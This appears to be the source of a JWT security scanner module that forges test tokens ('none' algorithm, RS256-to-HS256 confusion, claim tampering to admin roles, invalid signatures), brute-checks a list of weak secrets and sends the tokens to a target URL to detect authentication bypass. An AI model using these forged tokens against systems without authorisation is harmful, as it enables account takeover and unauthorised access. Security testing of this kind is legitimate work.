"""
VORTEX JWT (JSON Web Token) Security Scanner - V19.0
Detects JWT implementation vulnerabilities

DETECTION METHODS:
1. Algorithm confusion (none, HS256 vs RS256)
2. Weak/missing signature validation
3. Key confusion attacks
4. Token manipulation (claims, exp, etc.)
5. Secret brute-forcing indicators

AUTHORITY COMPLIANCE:
- Produces HEURISTIC_ONLY detections
- Requires AI analysis and system verification
- Final determination by authority enforcer
"""

import logging
import re
import uuid
import json
import base64
import hmac
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from datetime import datetime, timedelta

from scanners.base import BaseScanner
from domain.models import AssessmentResult
from domain.enums import FindingType, FindingSeverity, VerificationStatus, ConfidenceSource
from core.network import HTTPResponse

logger = logging.getLogger(__name__)


class JWTScanner(BaseScanner):
    """
    JWT vulnerability scanner.
    
    Tests for:
    - Algorithm confusion attacks
    - None algorithm acceptance
    - Weak signature validation
    - Token tampering
    - Insecure key usage
    """
    
    # Common JWT weak secrets for testing
    WEAK_SECRETS = [
        'secret', 'password', '123456', 'your-256-bit-secret',
        'your-secret', 'jwt-secret', 'default', 'test',
        'admin', 'key', 'token', 'auth'
    ]
    
    # Algorithm confusion payloads
    ALGORITHM_CONFUSION = [
        'none',
        'None',
        'NONE',
        'nOnE'
    ]
    
    def __init__(self):
        # Use AUTH_BYPASS as finding type since JWT issues lead to auth bypass
        super().__init__(FindingType.AUTH_BYPASS)
        self.detected_tokens: Dict[str, Dict[str, Any]] = {}
        
    async def scan(self, url: str, **kwargs) -> List[AssessmentResult]:
        """
        Scan for JWT vulnerabilities.
        
        Args:
            url: Target URL
            **kwargs: Optional parameters:
                - token: JWT token to analyze
                - headers: Request headers
                - test_endpoint: Whether to test endpoint with modified tokens
        
        Returns:
            List of JWT vulnerability findings
        """
        findings = []
        self.stats['scans_performed'] += 1
        
        token = kwargs.get('token')
        headers = kwargs.get('headers', {})
        test_endpoint = kwargs.get('test_endpoint', True)
        
        # Extract JWT from headers if not provided
        if not token:
            token = self._extract_jwt_from_headers(headers)
        
        if not token:
            logger.debug(f"No JWT token found for {url}")
            return findings
        
        try:
            # Parse JWT
            jwt_parts = self._parse_jwt(token)
            if not jwt_parts:
                return findings
            
            # Test 1: None algorithm attack
            none_findings = await self._test_none_algorithm(url, token, jwt_parts, test_endpoint)
            findings.extend(none_findings)
            
            # Test 2: Algorithm confusion (HS256 vs RS256)
            algo_findings = await self._test_algorithm_confusion(url, token, jwt_parts, test_endpoint)
            findings.extend(algo_findings)
            
            # Test 3: Weak secret
            secret_findings = await self._test_weak_secret(url, token, jwt_parts, test_endpoint)
            findings.extend(secret_findings)
            
            # Test 4: Token manipulation
            manip_findings = await self._test_token_manipulation(url, token, jwt_parts, test_endpoint)
            findings.extend(manip_findings)
            
            # Test 5: Signature validation
            sig_findings = await self._test_signature_validation(url, token, jwt_parts, test_endpoint)
            findings.extend(sig_findings)
            
            self.stats['findings_detected'] += len(findings)
        
        except Exception as e:
            logger.error(f"JWT scan error for {url}: {e}")
        
        return findings
    
    def _extract_jwt_from_headers(self, headers: Dict[str, str]) -> Optional[str]:
        """Extract JWT token from request headers."""
        # Check Authorization header
        auth_header = headers.get('Authorization', '') or headers.get('authorization', '')
        if auth_header.startswith('Bearer '):
            return auth_header[7:]
        
        # Check other common headers
        for header_name in ['X-Auth-Token', 'X-Access-Token', 'Token']:
            if header_name in headers:
                return headers[header_name]
        
        return None
    
    def _parse_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        """Parse JWT token into header, payload, signature."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header = self._base64_decode(parts[0])
            header_json = json.loads(header)
            
            # Decode payload
            payload = self._base64_decode(parts[1])
            payload_json = json.loads(payload)
            
            return {
                'header': header_json,
                'payload': payload_json,
                'signature': parts[2],
                'raw_header': parts[0],
                'raw_payload': parts[1],
                'original_token': token
            }
        
        except Exception as e:
            logger.debug(f"JWT parsing error: {e}")
            return None
    
    def _base64_decode(self, data: str) -> str:
        """Decode base64url encoded data."""
        # Add padding if needed
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        # Replace URL-safe chars
        data = data.replace('-', '+').replace('_', '/')
        
        return base64.b64decode(data).decode('utf-8')
    
    def _base64_encode(self, data: str) -> str:
        """Encode data to base64url."""
        encoded = base64.b64encode(data.encode('utf-8')).decode('utf-8')
        # Remove padding and make URL-safe
        return encoded.replace('+', '-').replace('/', '_').replace('=', '')
    
    async def _test_none_algorithm(self, url: str, token: str, 
                                   jwt_parts: Dict[str, Any],
                                   test_endpoint: bool) -> List[AssessmentResult]:
        """Test if 'none' algorithm is accepted."""
        findings = []
        
        for none_alg in self.ALGORITHM_CONFUSION:
            try:
                # Create token with 'none' algorithm
                modified_header = jwt_parts['header'].copy()
                modified_header['alg'] = none_alg
                
                # Reconstruct token without signature
                new_header = self._base64_encode(json.dumps(modified_header))
                new_payload = jwt_parts['raw_payload']
                none_token = f"{new_header}.{new_payload}."
                
                if test_endpoint:
                    # Test with endpoint
                    headers = {'Authorization': f'Bearer {none_token}'}
                    response = await self.network_client.request('GET', url, headers=headers)
                    self.stats['requests_made'] += 1
                    
                    # If accepted (200, 201), it's vulnerable
                    if response.status_code in [200, 201]:
                        confidence = 0.90
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.AUTH_BYPASS,
                            severity=FindingSeverity.CRITICAL,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"JWT with 'alg: {none_alg}' accepted without signature",
                            vulnerable_parameter='jwt_algorithm',
                            payload=none_token,
                            description="JWT accepts 'none' algorithm - critical authentication bypass",
                            remediation="Explicitly reject 'none' algorithm in JWT validation"
                        )
                        findings.append(finding)
                        break
                else:
                    # Static analysis only
                    confidence = 0.60
                    finding = AssessmentResult(
                        id=uuid.uuid4(),
                        url=url,
                        finding_type=FindingType.AUTH_BYPASS,
                        severity=FindingSeverity.HIGH,
                        status=VerificationStatus.DETECTED,
                        heuristic_score=confidence,
                        confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                        evidence=f"JWT may accept 'none' algorithm",
                        vulnerable_parameter='jwt_algorithm',
                        payload=none_token,
                        description="Potential JWT 'none' algorithm vulnerability",
                        remediation="Explicitly reject 'none' algorithm in JWT validation"
                    )
                    findings.append(finding)
            
            except Exception as e:
                logger.debug(f"None algorithm test error: {e}")
                continue
        
        return findings
    
    async def _test_algorithm_confusion(self, url: str, token: str,
                                       jwt_parts: Dict[str, Any],
                                       test_endpoint: bool) -> List[AssessmentResult]:
        """Test algorithm confusion (HS256 vs RS256)."""
        findings = []
        
        current_alg = jwt_parts['header'].get('alg', '')
        
        # Test RS256 -> HS256 confusion
        if current_alg == 'RS256' and test_endpoint:
            try:
                # Modify to HS256
                modified_header = jwt_parts['header'].copy()
                modified_header['alg'] = 'HS256'
                
                # Try with common weak secrets
                for secret in self.WEAK_SECRETS[:3]:  # Test top 3
                    new_header = self._base64_encode(json.dumps(modified_header))
                    new_payload = jwt_parts['raw_payload']
                    
                    # Sign with HMAC
                    message = f"{new_header}.{new_payload}"
                    signature = hmac.new(
                        secret.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                    new_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                    
                    confused_token = f"{new_header}.{new_payload}.{new_signature}"
                    
                    # Test with endpoint
                    headers = {'Authorization': f'Bearer {confused_token}'}
                    response = await self.network_client.request('GET', url, headers=headers)
                    self.stats['requests_made'] += 1
                    
                    if response.status_code in [200, 201]:
                        confidence = 0.95
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.AUTH_BYPASS,
                            severity=FindingSeverity.CRITICAL,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"RS256 token accepted as HS256 with secret '{secret}'",
                            vulnerable_parameter='jwt_algorithm_validation',
                            payload=confused_token,
                            description="JWT algorithm confusion vulnerability (RS256->HS256)",
                            remediation="Enforce strict algorithm validation and use algorithm whitelist"
                        )
                        findings.append(finding)
                        break
            
            except Exception as e:
                logger.debug(f"Algorithm confusion test error: {e}")
        
        return findings
    
    async def _test_weak_secret(self, url: str, token: str,
                               jwt_parts: Dict[str, Any],
                               test_endpoint: bool) -> List[AssessmentResult]:
        """Test for weak JWT secrets."""
        findings = []
        
        current_alg = jwt_parts['header'].get('alg', '')
        
        if current_alg in ['HS256', 'HS384', 'HS512']:
            # Try to verify with weak secrets
            for secret in self.WEAK_SECRETS:
                try:
                    # Reconstruct and sign
                    message = f"{jwt_parts['raw_header']}.{jwt_parts['raw_payload']}"
                    
                    if current_alg == 'HS256':
                        hash_func = hashlib.sha256
                    elif current_alg == 'HS384':
                        hash_func = hashlib.sha384
                    else:  # HS512
                        hash_func = hashlib.sha512
                    
                    signature = hmac.new(
                        secret.encode(),
                        message.encode(),
                        hash_func
                    ).digest()
                    
                    expected_sig = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                    
                    # Compare with actual signature
                    if expected_sig == jwt_parts['signature']:
                        confidence = 0.95
                        
                        finding = AssessmentResult(
                            id=uuid.uuid4(),
                            url=url,
                            finding_type=FindingType.AUTH_BYPASS,
                            severity=FindingSeverity.CRITICAL,
                            status=VerificationStatus.DETECTED,
                            heuristic_score=confidence,
                            confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                            evidence=f"JWT signed with weak secret: '{secret}'",
                            vulnerable_parameter='jwt_secret',
                            payload=secret,
                            description="JWT uses weak/default secret key",
                            remediation="Use strong, randomly generated secret (min 256 bits)"
                        )
                        findings.append(finding)
                        break
                
                except Exception as e:
                    logger.debug(f"Weak secret test error: {e}")
                    continue
        
        return findings
    
    async def _test_token_manipulation(self, url: str, token: str,
                                      jwt_parts: Dict[str, Any],
                                      test_endpoint: bool) -> List[AssessmentResult]:
        """Test token claim manipulation."""
        findings = []
        
        if not test_endpoint:
            return findings
        
        # Test claim manipulation
        manipulations = [
            ('user_id', '1'),  # Change to admin user
            ('role', 'admin'),
            ('is_admin', True),
            ('permissions', ['admin', 'root']),
            ('exp', int((datetime.now() + timedelta(days=365)).timestamp()))  # Extend expiry
        ]
        
        for claim_name, claim_value in manipulations:
            try:
                # Modify payload
                modified_payload = jwt_parts['payload'].copy()
                modified_payload[claim_name] = claim_value
                
                # Reconstruct token (keep original signature - test if validated)
                new_payload = self._base64_encode(json.dumps(modified_payload))
                tampered_token = f"{jwt_parts['raw_header']}.{new_payload}.{jwt_parts['signature']}"
                
                # Test with endpoint
                headers = {'Authorization': f'Bearer {tampered_token}'}
                response = await self.network_client.request('GET', url, headers=headers)
                self.stats['requests_made'] += 1
                
                if response.status_code in [200, 201]:
                    confidence = 0.85
                    
                    finding = AssessmentResult(
                        id=uuid.uuid4(),
                        url=url,
                        finding_type=FindingType.AUTH_BYPASS,
                        severity=FindingSeverity.CRITICAL,
                        status=VerificationStatus.DETECTED,
                        heuristic_score=confidence,
                        confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                        evidence=f"JWT accepted with modified claim '{claim_name}': {claim_value}",
                        vulnerable_parameter='jwt_signature_validation',
                        payload=tampered_token,
                        description="JWT signature not properly validated - claims can be modified",
                        remediation="Implement proper JWT signature verification"
                    )
                    findings.append(finding)
                    break
            
            except Exception as e:
                logger.debug(f"Token manipulation test error: {e}")
                continue
        
        return findings
    
    async def _test_signature_validation(self, url: str, token: str,
                                        jwt_parts: Dict[str, Any],
                                        test_endpoint: bool) -> List[AssessmentResult]:
        """Test if signature is validated at all."""
        findings = []
        
        if not test_endpoint:
            return findings
        
        try:
            # Send token with corrupted signature
            corrupted_token = f"{jwt_parts['raw_header']}.{jwt_parts['raw_payload']}.invalid_signature"
            
            headers = {'Authorization': f'Bearer {corrupted_token}'}
            response = await self.network_client.request('GET', url, headers=headers)
            self.stats['requests_made'] += 1
            
            if response.status_code in [200, 201]:
                confidence = 0.90
                
                finding = AssessmentResult(
                    id=uuid.uuid4(),
                    url=url,
                    finding_type=FindingType.AUTH_BYPASS,
                    severity=FindingSeverity.CRITICAL,
                    status=VerificationStatus.DETECTED,
                    heuristic_score=confidence,
                    confidence_source=ConfidenceSource.HEURISTIC_ONLY,
                    evidence="JWT accepted with invalid signature",
                    vulnerable_parameter='jwt_signature_validation',
                    payload=corrupted_token,
                    description="JWT signature validation is not implemented",
                    remediation="Implement proper JWT signature verification before accepting tokens"
                )
                findings.append(finding)
        
        except Exception as e:
            logger.debug(f"Signature validation test error: {e}")
        
        return findings
    
    def generate_payloads(self, **kwargs) -> List[str]:
        """
        Generate JWT test payloads.
        
        Returns:
            List of JWT attack payloads
        """
        payloads = []
        
        # None algorithm payloads
        payloads.extend(self.ALGORITHM_CONFUSION)
        
        # Weak secrets
        payloads.extend(self.WEAK_SECRETS)
        
        # Claim manipulation examples
        payloads.extend([
            '{"user_id": "1"}',
            '{"role": "admin"}',
            '{"is_admin": true}',
            '{"exp": 9999999999}'
        ])
        
        return payloads
    
    def analyze_response(self, response: HTTPResponse, payload: str) -> Dict[str, Any]:
        """
        Analyze response for JWT vulnerability indicators.
        
        Args:
            response: HTTP response
            payload: Payload that was sent
        
        Returns:
            Analysis dict with detection results
        """
        detected = False
        confidence = 0.0
        evidence = ""
        
        # If modified JWT is accepted, it's vulnerable
        if response.status_code in [200, 201]:
            detected = True
            confidence = 0.85
            evidence = "Modified JWT token accepted by server"
        
        # Check for JWT-related errors
        jwt_errors = ['invalid token', 'jwt', 'signature', 'expired', 'malformed']
        body_lower = response.body.lower()
        
        if response.status_code in [401, 403]:
            if any(err in body_lower for err in jwt_errors):
                evidence = "JWT properly rejected (good security)"
            else:
                evidence = "Request rejected but no clear JWT error"
        
        return {
            'detected': detected,
            'confidence': confidence,
            'evidence': evidence,
            'response_analysis': {
                'status_code': response.status_code,
                'has_jwt_error': any(err in body_lower for err in jwt_errors)
            }
        }


# Global scanner instance
global_jwt_scanner: Optional[JWTScanner] = None


def get_jwt_scanner() -> JWTScanner:
    """Get or create global JWT scanner instance."""
    global global_jwt_scanner
    
    if global_jwt_scanner is None:
        global_jwt_scanner = JWTScanner()
    
    return global_jwt_scanner